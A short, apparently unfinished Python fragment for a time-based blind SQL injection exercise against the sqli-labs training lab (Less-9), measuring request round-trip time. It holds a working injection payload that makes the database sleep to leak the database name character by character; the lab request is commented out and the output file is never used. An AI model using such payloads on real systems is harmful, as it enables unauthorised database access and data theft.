import time , requests

start = time.time()
f = open("RTs.txt" , "w")
payload = {"id": "1' and if (ascii(substr(database(), 1, 1))=115,sleep(3),null) --+"}
# r = requests.get('http://127.0.0.1/sqli-labs/Less-9', params=payload)
requests.get('http://192.168.0.142')
# time.sleep(5)
roundtrip = (time.time() - start) * 1000
# print ("%0.2f" %(float(roundtrip)))

RT=round(roundtrip, 2)